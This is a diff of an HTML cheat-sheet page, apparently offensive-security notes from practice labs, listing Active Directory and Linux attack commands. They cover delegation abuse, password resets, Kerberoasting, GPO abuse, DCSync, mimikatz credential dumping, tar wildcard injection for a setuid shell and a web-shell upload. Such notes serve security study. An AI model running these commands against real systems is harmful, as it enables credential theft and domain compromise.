-<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>impacket-rbcd resourced.local/l.livingstone -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -delegate-from <span style="color:#e6db74">&#39;fake$&#39;</span> -delegate-to <span style="color:#e6db74">&#39;RESOURCEDC$&#39;</span> -action write -dc-ip 192.168.176.175
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>impacket-rbcd resourced.local/l.livingstone -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -delegate-from <span style="color:#e6db74">&#39;fake$&#39;</span> -delegate-to <span style="color:#e6db74">&#39;RESOURCEDC$&#39;</span> -action write -dc-ip 192.168.176.175
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Delegation rights modified successfully!
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> fake$ can now impersonate users on RESOURCEDC$ via S4U2Proxy
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Accounts allowed to act on behalf of other identity:
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span>     fake$        <span style="color:#f92672">(</span>S-1-5-21-537427935-490066102-1511301751-4101<span style="color:#f92672">)</span></span></span></code></pre></div>
+<h3 id="genericall-on-user">GenericAll on User<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h3>
+<ul>
+<li>can change the target password</li>
+</ul>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>net rpc password <span style="color:#e6db74">&#39;michael&#39;</span> <span style="color:#e6db74">&#39;Password1!&#39;</span> -U administrator.htb/olivia%ichliebedich -S 10.129.5.216</span></span></code></pre></div>
+<h3 id="forcechangepassword">ForceChangePassword<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h3>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>net rpc password <span style="color:#e6db74">&#39;benjamin&#39;</span> <span style="color:#e6db74">&#39;Password1!&#39;</span> -U administrator.htb/michael%<span style="color:#e6db74">&#39;Password1!&#39;</span> -S 10.129.5.216</span></span></code></pre></div>
+<h3 id="genericwrite">GenericWrite<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h3>
+<p><a href="#R-image-23368a7db7e5e7d4df1b96570f0c4ae6" class="lightbox-link"><img alt="genericwrite" class="lazy lightbox figure-image" loading="lazy" src="/images/administrator/genericwrite.png" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-23368a7db7e5e7d4df1b96570f0c4ae6"><img alt="genericwrite" class="lazy lightbox lightbox-image" loading="lazy" src="/images/administrator/genericwrite.png"></a></p>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 targetedKerberoast.py -v -d <span style="color:#e6db74">&#39;administrator.htb&#39;</span> -u <span style="color:#e6db74">&#39;emily&#39;</span> -p <span style="color:#e6db74">&#39;UXLCI5iETUsIBoFVTj8yQFKoHjXmb&#39;</span></span></span></code></pre></div>
 <h3 id="writeowner">WriteOwner<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h3>
-<p><a href="#R-image-47747eb666db34ff64c125c79304a7da" class="lightbox-link"><img alt="bloodhound" class="lazy lightbox figure-image" loading="lazy" src="/images/vault/vault-bloodhound.png" style="height: auto;width: auto;"></a>
-<a href="javascript:history.back();" class="lightbox-back" id="R-image-47747eb666db34ff64c125c79304a7da"><img alt="bloodhound" class="lazy lightbox lightbox-image" loading="lazy" src="/images/vault/vault-bloodhound.png"></a></p>
+<p><a href="#R-image-78ecc18055dbfa2c3286ec80ca890b45" class="lightbox-link"><img alt="bloodhound" class="lazy lightbox figure-image" loading="lazy" src="/images/vault/vault-bloodhound.png" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-78ecc18055dbfa2c3286ec80ca890b45"><img alt="bloodhound" class="lazy lightbox lightbox-image" loading="lazy" src="/images/vault/vault-bloodhound.png"></a></p>
 <ul>
 <li>make the user (anirudh) owner of the policy.</li>
 </ul>
-<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>impacket-owneredit -action write -new-owner <span style="color:#e6db74">&#39;anirudh&#39;</span> -target-dn <span style="color:#e6db74">&#39;CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=POLICIES,CN=SYSTEM,DC=VAULT,DC=OFFSEC&#39;</span> <span style="color:#e6db74">&#39;vault&#39;</span>/<span style="color:#e6db74">&#39;anirudh&#39;</span>:<span style="color:#e6db74">&#39;SecureHM&#39;</span></span></span></code></pre></div>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>impacket-owneredit -action write -new-owner <span style="color:#e6db74">&#39;anirudh&#39;</span> -target-dn <span style="color:#e6db74">&#39;CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=POLICIES,CN=SYSTEM,DC=VAULT,DC=OFFSEC&#39;</span> <span style="color:#e6db74">&#39;vault&#39;</span>/<span style="color:#e6db74">&#39;anirudh&#39;</span>:<span style="color:#e6db74">&#39;SecureHM&#39;</span></span></span></code></pre></div>
 <ul>
 <li>give all privileges to the user</li>
 </ul>
-<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>impacket-dacledit -action <span style="color:#e6db74">&#39;write&#39;</span> -rights <span style="color:#e6db74">&#39;WriteMembers&#39;</span> -principal <span style="color:#e6db74">&#39;anirudh&#39;</span> -target-dn <span style="color:#e6db74">&#39;CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=POLICIES,CN=SYSTEM,DC=VAULT,DC=OFFSEC&#39;</span> <span style="color:#e6db74">&#39;vault&#39;</span>/<span style="color:#e6db74">&#39;anirudh&#39;</span>:<span style="color:#e6db74">&#39;SecureHM&#39;</span> -dc-ip 192.168.115.172</span></span></code></pre></div>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>impacket-dacledit -action <span style="color:#e6db74">&#39;write&#39;</span> -rights <span style="color:#e6db74">&#39;WriteMembers&#39;</span> -principal <span style="color:#e6db74">&#39;anirudh&#39;</span> -target-dn <span style="color:#e6db74">&#39;CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=POLICIES,CN=SYSTEM,DC=VAULT,DC=OFFSEC&#39;</span> <span style="color:#e6db74">&#39;vault&#39;</span>/<span style="color:#e6db74">&#39;anirudh&#39;</span>:<span style="color:#e6db74">&#39;SecureHM&#39;</span> -dc-ip 192.168.115.172</span></span></code></pre></div>
 <ul>
 <li>Add the user to local admin using SharpGPOAbuse.exe</li>
 </ul>
-<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount anirudh --GPOName <span style="color:#e6db74">&#34;Default Domain Policy&#34;</span></span></span></code></pre></div>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount anirudh --GPOName <span style="color:#e6db74">&#34;Default Domain Policy&#34;</span></span></span></code></pre></div>
 <ul>
 <li>Update the policy</li>
 </ul>
-<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>gpupdate /force</span></span></code></pre></div>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>gpupdate /force</span></span></code></pre></div>
 <h3 id="allextendedrights">AllExtendedRights<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h3>
 <ul>
 <li>import powerview</li>
 </ul>
-<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Import-Module .\PowerView.ps1</span></span></code></pre></div>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Import-Module .\PowerView.ps1</span></span></code></pre></div>
 <ul>
 <li>reset password</li>
 </ul>
-<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Set-DomainUserPassword -Identity <span style="color:#e6db74">&#39;target_user&#39;</span> -Verbose</span></span></code></pre></div>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Set-DomainUserPassword -Identity <span style="color:#e6db74">&#39;target_user&#39;</span> -Verbose</span></span></code></pre></div>
+<h3 id="getchanges-getchangesall">getchanges, getchangesall<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h3>
+<ul>
+<li>can perform DCsync</li>
+</ul>
+<p><a href="#R-image-22b8a6479ccc29b5d0e99728ee476fa3" class="lightbox-link"><img alt="getchanges" class="lazy lightbox figure-image" loading="lazy" src="/images/sauna/getchanges.png" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-22b8a6479ccc29b5d0e99728ee476fa3"><img alt="getchanges" class="lazy lightbox lightbox-image" loading="lazy" src="/images/sauna/getchanges.png"></a></p>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0"><code>impacket-secretsdump &#39;egotistical-bank.local&#39;/&#39;svc_loanmgr&#39;:&#39;Moneymakestheworldgoround!&#39;@10.129.12.141</code></pre></div>
 <h2 id="mimikatz">mimikatz<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h2>
-<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>sekurlsa::logonpasswords
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>sekurlsa::logonpasswords
 </span></span><span style="display:flex;"><span>sekurlsa::wdigest
 </span></span><span style="display:flex;"><span>lsadump::sam
 </span></span><span style="display:flex;"><span>lsadump::lsa
@@ -385,7 +462,7 @@ AS-REP Roasting (user account) windows .\Rubeus.exe asreproast /nowrap /outfile:
 <ul>
 <li>one liner</li>
 </ul>
-<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>.\mimikatz.exe <span style="color:#e6db74">&#34;privilege::debug&#34;</span> <span style="color:#e6db74">&#34;token::elevate&#34;</span> <span style="color:#e6db74">&#34;lsadump::sam&#34;</span> <span style="color:#e6db74">&#34;exit&#34;</span>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>.\mimikatz.exe <span style="color:#e6db74">&#34;privilege::debug&#34;</span> <span style="color:#e6db74">&#34;token::elevate&#34;</span> <span style="color:#e6db74">&#34;lsadump::sam&#34;</span> <span style="color:#e6db74">&#34;exit&#34;</span>
 </span></span><span style="display:flex;"><span>.\mimikatz.exe <span style="color:#e6db74">&#34;privilege::debug&#34;</span> <span style="color:#e6db74">&#34;token::elevate&#34;</span> <span style="color:#e6db74">&#34;sekurlsa::logonpasswords&#34;</span> <span style="color:#e6db74">&#34;exit&#34;</span>
 </span></span><span style="display:flex;"><span>.\mimikatz.exe <span style="color:#e6db74">&#34;privilege::debug&#34;</span> <span style="color:#e6db74">&#34;token::elevate&#34;</span> <span style="color:#e6db74">&#34;lsadump::secrets&#34;</span> <span style="color:#e6db74">&#34;exit&#34;</span>
 </span></span><span style="display:flex;"><span>.\mimikatz.exe <span style="color:#e6db74">&#34;privilege::debug&#34;</span> <span style="color:#e6db74">&#34;token::elevate&#34;</span> <span style="color:#e6db74">&#34;lsadump::lsa&#34;</span> <span style="color:#e6db74">&#34;exit&#34;</span>
@@ -396,40 +473,49 @@ AS-REP Roasting (user account) windows .\Rubeus.exe asreproast /nowrap /outfile:
 <ul>
 <li>create shell.sh file</li>
 </ul>
-<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>cp /bin/bash /tmp/bash2
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>cp /bin/bash /tmp/bash2
 </span></span><span style="display:flex;"><span>chmod +s /tmp/bash2</span></span></code></pre></div>
 <ul>
 <li>create checkpoint options</li>
 </ul>
-<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>touch -- <span style="color:#e6db74">&#34;--checkpoint=1&#34;</span>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>touch -- <span style="color:#e6db74">&#34;--checkpoint=1&#34;</span>
 </span></span><span style="display:flex;"><span>touch -- <span style="color:#e6db74">&#34;--checkpoint-action=exec=sh shell.sh&#34;</span></span></span></code></pre></div>
 <h3 id="7za">7za<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h3>
 <p><code>7za a /opt/backups/backup.zip -p$password -tzip *.zip &gt; /opt/backups/backup.log</code></p>
 <ul>
 <li>link a file of interest</li>
 </ul>
-<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>touch @root.zip
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>touch @root.zip
 </span></span><span style="display:flex;"><span>ln -s /root/proof.txt root.zip</span></span></code></pre></div>
 <ul>
 <li>check the log file after executed</li>
 </ul>
-<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>cat /opt/backups/backup.log </span></span></code></pre></div>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>cat /opt/backups/backup.log </span></span></code></pre></div>
 <h2 id="nxc">nxc<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h2>
 <h3 id="ldap">ldap<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h3>
 <ul>
 <li>grep accounts</li>
 </ul>
-<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>nxc ldap hutch.offsec -u <span style="color:#e6db74">&#39;&#39;</span> -p <span style="color:#e6db74">&#39;&#39;</span> --query <span style="color:#e6db74">&#34;(sAMAccountName=*)&#34;</span> <span style="color:#e6db74">&#34;&#34;</span> | grep sAMAccountName</span></span></code></pre></div>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>nxc ldap hutch.offsec -u <span style="color:#e6db74">&#39;&#39;</span> -p <span style="color:#e6db74">&#39;&#39;</span> --query <span style="color:#e6db74">&#34;(sAMAccountName=*)&#34;</span> <span style="color:#e6db74">&#34;&#34;</span> | grep sAMAccountName</span></span></code></pre></div>
 <ul>
 <li>grep description</li>
 </ul>
-<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>nxc ldap hutch.offsec -u <span style="color:#e6db74">&#39;&#39;</span> -p <span style="color:#e6db74">&#39;&#39;</span> --query <span style="color:#e6db74">&#34;(sAMAccountName=*)&#34;</span> <span style="color:#e6db74">&#34;&#34;</span> | grep description   </span></span></code></pre></div>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>nxc ldap hutch.offsec -u <span style="color:#e6db74">&#39;&#39;</span> -p <span style="color:#e6db74">&#39;&#39;</span> --query <span style="color:#e6db74">&#34;(sAMAccountName=*)&#34;</span> <span style="color:#e6db74">&#34;&#34;</span> | grep description   </span></span></code></pre></div>
+<h2 id="ldapsearch">ldapsearch<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h2>
+<ul>
+<li>make a user list</li>
+</ul>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ldapsearch -x -H ldap://10.129.234.71 -b <span style="color:#e6db74">&#34;dc=baby,dc=vl&#34;</span> | grep -i samaccountname | cut -d <span style="color:#e6db74">&#39;:&#39;</span> -f <span style="color:#ae81ff">2</span> |tr -d <span style="color:#e6db74">&#39; &#39;</span> &gt; users.txt</span></span></code></pre></div>
+<ul>
+<li>enum all properties</li>
+</ul>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ldapsearch -x -b <span style="color:#e6db74">&#34;dc=baby,dc=vl&#34;</span> <span style="color:#e6db74">&#34;*&#34;</span> -H ldap://BabyDC.baby.vl</span></span></code></pre></div>
 <h2 id="webdav">webdav<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h2>
 <h3 id="davtest">davtest<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h3>
 <ul>
 <li>find uploadable file type</li>
 </ul>
-<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>davtest -auth fmcsorley:CrabSharkJellyfish192 -sendbd auto -url http://192.168.158.122
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>davtest -auth fmcsorley:CrabSharkJellyfish192 -sendbd auto -url http://192.168.158.122
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>PUT File: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/davtest_LOqKQmYZCD2Fd.pl
 </span></span><span style="display:flex;"><span>PUT File: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/davtest_LOqKQmYZCD2Fd.html
@@ -441,15 +527,15 @@ AS-REP Roasting (user account) windows .\Rubeus.exe asreproast /nowrap /outfile:
 <ul>
 <li>upload a file</li>
 </ul>
-<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>davtest -auth fmcsorley:CrabSharkJellyfish192 -uploadfile rev.aspx -uploadloc DavTestDir_LOqKQmYZCD2Fd -url http://192.168.158.122</span></span></code></pre></div>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>davtest -auth fmcsorley:CrabSharkJellyfish192 -uploadfile rev.aspx -uploadloc DavTestDir_LOqKQmYZCD2Fd -url http://192.168.158.122</span></span></code></pre></div>
 <h2 id="ssh">SSH<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h2>
 <h3 id="remote-port-forwarding-target---kali">remote port forwarding (target -&gt; kali)<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h3>
 <ul>
 <li>forward port 80 and 14147</li>
 </ul>
-<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>ssh -N -R 80:127.0.0.1:80 -R 14147:127.0.0.1:14147 kali@192.168.45.247</span></span></code></pre></div>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>ssh -N -R 80:127.0.0.1:80 -R 14147:127.0.0.1:14147 kali@192.168.45.247</span></span></code></pre></div>
 <h3 id="local-port-forwarding-kali---target">local port forwarding (kali -&gt; target)<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h3>
-<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>ssh -N -L 8000:127.0.0.1:8000 dev@192.168.249.150</span></span></code></pre></div>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>ssh -N -L 8000:127.0.0.1:8000 dev@192.168.249.150</span></span></code></pre></div>
 <h2 id="impacket">Impacket<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h2>
 <h3 id="impacket-secretsdump">impacket-secretsdump<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h3>
 <p>It&rsquo;s like a mimikatz that can be used remotely.</p>
@@ -457,37 +543,37 @@ AS-REP Roasting (user account) windows .\Rubeus.exe asreproast /nowrap /outfile:
 <ul>
 <li>local admin</li>
 </ul>
-<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>impacket-secretsdump marvel.local/fcastle:Password1@$IP
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>impacket-secretsdump marvel.local/fcastle:Password1@$IP
 </span></span><span style="display:flex;"><span>impacket-secretsdump administrator:@$IP -hahes :$NT</span></span></code></pre></div>
 <ul>
 <li>domain admin</li>
 </ul>
-<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>impacket-secretsdump MARVEL.local/hawkeye:<span style="color:#e6db74">&#39;Password1&#39;</span>@$DC -just-dc-ntlm</span></span></code></pre></div>
